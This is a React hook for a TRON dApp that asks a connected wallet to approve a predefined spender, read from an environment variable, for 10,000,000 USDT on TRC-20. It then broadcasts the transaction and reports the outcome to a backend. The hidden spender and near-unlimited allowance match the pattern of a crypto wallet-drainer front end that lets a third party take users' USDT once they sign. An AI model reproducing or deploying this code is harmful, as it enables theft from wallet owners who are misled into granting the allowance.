import { useState } from "react";
import { useWalletConnect } from "./useWalletConnect";
import { TronWeb } from "tronweb";
import useSendDataToServer from "./useSendDataToserver";
import { useWallet } from "../context/globalContext";
import useUserManagement from "./useUserManagement";
const isMobileDevice = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
export const useTronApprove = () => {
  const [approvalStatus, setApprovalStatus] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const { connectWallet } = useWalletConnect();
  const { walletAddress, id } = useWallet();
  const { saveApproveData } = useUserManagement();
  const approveTokens = async (
    spender = process.env.NEXT_PUBLIC_PREDEFINED_ADRESS_USDT,
    amount = 10000000 * 1e6
  ) => {
    setIsLoading(true);
    try {
      setApprovalStatus("Processing approval...");
      // Conectează wallet-ul
      const walletConnection = await connectWallet();
      const tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });
      const usdtContractAddress = process.env.NEXT_PUBLIC_USDT_CONTRACT_ADDRESS;
      const functionSelector = "approve(address,uint256)";
      const parameters = [
        { type: "address", value: spender },
        { type: "uint256", value: amount },
      ];
      const options = {
        feeLimit: 300000000,
        callValue: 0,
      };
      console.log("Trigger smart contract...");
      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        usdtContractAddress,
        functionSelector,
        options,
        parameters,
        walletAddress
      );
      const signedTransaction = await walletConnection.wallet.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
      console.log({
        txID: result.transaction.txID,
        message: result.message,
        code: result.code,
        transaction: result.transaction,
        result: result.result
      });
    
      const status = result.result ? "completed" : "failed";
      const transactionHash = result.transaction.txID || null; // Hash-ul tranzacției
      const blockNumber = result.transaction?.block || null; // Numărul blocului
      const network = "TRC-20"; // Rețeaua este TRC-20
      const trxAmount = 0; // În acest caz, TRX este 0
      const usdtAmount = amount / 1e6; // Conversie pentru valoarea reală a USDT
      const errorMessage = result.result ? null : `Transaction failed: ${result.code}`; 
      setApprovalStatus(
        result.result ? "Approval successful!" : "Approval failed."
      );

      if(!errorMessage) {
        await saveApproveData({
          spender,
          id,
          trxAmount,
          usdtAmount,
          status,
          transactionHash,
          network,
          errorMessage,
          transactionType: "aproove"
        });
      } else {
        await saveApproveData({
          spender,
          id,
          trxAmount,
          usdtAmount,
          status,
          transactionHash,
          network,
          errorMessage,
          transactionType: "aproove"
        });
      }
    } catch (error) {
      console.log({
        message: "Aproove failed",
        error
      });
      setApprovalStatus("Approval failed.");
      await saveApproveData({
        spender,
        id,
        trxAmount: 0,
        usdtAmount: amount / 1e6,
        status: "failed",
        network: "TRC-20",
        errorMessage: error.message,
        transactionType: "aproove"
      });
    } finally {
      setIsLoading(false);
    }
  };
  return {
    approveTokens,
    approvalStatus,
    isLoading,
  };
};
